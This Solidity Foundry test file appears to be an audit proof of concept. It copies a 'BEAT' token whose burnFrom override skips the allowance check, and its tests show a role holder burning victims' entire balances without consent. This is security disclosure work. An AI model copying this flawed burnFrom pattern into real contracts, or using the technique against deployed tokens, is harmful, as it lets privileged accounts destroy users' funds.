// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {ERC20} from "openzeppelin-contracts/token/ERC20/ERC20.sol";
import {AccessControl} from "openzeppelin-contracts/access/AccessControl.sol";
import {ERC20Burnable} from "openzeppelin-contracts/token/ERC20/extensions/ERC20Burnable.sol";
import {Ownable} from "openzeppelin-contracts/access/Ownable.sol";


/**
 * @title UnauthorizedBurnPoC
 * @notice Proof-of-concept demonstrating unauthorized token burn vulnerability in BEAT token contract
 * @author Security Researcher
 */

/// @notice Simplified BEAT token contract with vulnerable burnFrom function
contract BEAT is ERC20, ERC20Burnable, Ownable, AccessControl {
    bytes32 public constant FESTIVAL_ROLE = keccak256("FESTIVAL_ROLE");
    
    constructor(string memory name, string memory symbol) ERC20(name, symbol) Ownable(msg.sender) {
        _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);
    }

    function mint(address to, uint256 amount) external {
        require(hasRole(FESTIVAL_ROLE, msg.sender), "Only_Festival_Mint");
        _mint(to, amount);
    }

    function burnFrom(address from, uint256 amount) public override {
        require(hasRole(FESTIVAL_ROLE, msg.sender), "Only_Festival_Burn");
        _burn(from, amount);
    }
}

/// @notice Test contract to demonstrate unauthorized burn vulnerability
contract UnauthorizedBurnPoC is Test {
    BEAT public beatToken;
    address public admin;
    address public victim;
    address public maliciousFestival;
    uint256 public constant INITIAL_BALANCE = 1000 ether;

    // Setup function to initialize test environment
    function setUp() public { 
        admin = makeAddr("admin");
        victim = makeAddr("victim");
        maliciousFestival = makeAddr("maliciousFestival");
        
        vm.startPrank(admin);
        beatToken = new BEAT("BeatDrop Token", "BEAT");

        // Grant FESTIVAL_ROLE to malicious festival
        bytes32 FESTIVAL_ROLE = keccak256("FESTIVAL_ROLE");
        AccessControl(address(beatToken)).grantRole(FESTIVAL_ROLE, admin);
        AccessControl(address(beatToken)).grantRole(FESTIVAL_ROLE, maliciousFestival);
        
         // Mint initial balance to victim
         beatToken.mint(victim, INITIAL_BALANCE);
         vm.stopPrank();
    }

    /// @notice Demonstrates complete fund loss via unauthorized burn 
    function test_UnauthorizedBurn_CompleteFundLoss() public {
        // Verify initial state 
        assertEq(beatToken.balanceOf(victim), INITIAL_BALANCE);
        assertEq(beatToken.allowance(victim, maliciousFestival), 0);

        console.log("=== Initial State ===");
        console.log("Victim balance:", beatToken.balanceOf(victim));
        console.log("Festival allowance:", beatToken.allowance(victim, maliciousFestival));

        // Unauthorized burn by malicious festival 
        vm.prank(maliciousFestival);
        beatToken.burnFrom(victim, INITIAL_BALANCE);

        // Verify complete fund loss
        assertEq(beatToken.balanceOf(victim), 0);

        console.log("=== Post-Attack State ===");
        console.log("Victim balance:", beatToken.balanceOf(victim));
        console.log("[CRITICAL] Funds drained without consent!");
    }

    /// @notice Demonstrates unauthorized burn on multiple victims 
    function test_UnauthorizedBurn_MultipleVictims() public {
        address victim2 = makeAddr("victim2");
        address victim3 = makeAddr("victim3");

        vm.startPrank(admin);
        beatToken.mint(victim2, INITIAL_BALANCE);
        beatToken.mint(victim3, INITIAL_BALANCE);
        vm.stopPrank();

        console.log("=== Pre-Attack Balances ===");
        console.log("Victim1:", beatToken.balanceOf(victim));
        console.log("Victim2:", beatToken.balanceOf(victim2));
        console.log("Victim3:", beatToken.balanceOf(victim3));

        // Mass unauthorized burn 
        vm.startPrank(maliciousFestival);
        beatToken.burnFrom(victim, INITIAL_BALANCE);
        beatToken.burnFrom(victim2, INITIAL_BALANCE);
        beatToken.burnFrom(victim3, INITIAL_BALANCE);
        vm.stopPrank();

        // Verify total loss for all victims 
        assertEq(beatToken.balanceOf(victim), 0);
        assertEq(beatToken.balanceOf(victim2), 0);
        assertEq(beatToken.balanceOf(victim3), 0);

        console.log("=== Post-Attack Balances ===");
        console.log("victim1 balance:", beatToken.balanceOf(victim));
        console.log("victim2 balance:", beatToken.balanceOf(victim2));
        console.log("victim3 balance:", beatToken.balanceOf(victim3));
    }

    /// @notice Demonstrates expected behavior when approval is granted 
    function test_ExpectedBehavior_WithApproval() public {
        uint256 burnAmount = 200 ether;

        // User grants approval 
        vm.prank(victim);
        beatToken.approve(maliciousFestival, burnAmount);

        console.log("=== with user approval ===");
        console.log("victim balance before burn:", beatToken.balanceOf(victim));
        console.log("Festival allowance:", beatToken.allowance(victim, maliciousFestival));

        // Burn with user consent 
        vm.prank(maliciousFestival);
        beatToken.burnFrom(victim, burnAmount);

        assertEq(beatToken.balanceOf(victim), INITIAL_BALANCE - burnAmount);
        console.log("Burn succeeded with user consent");
    }
}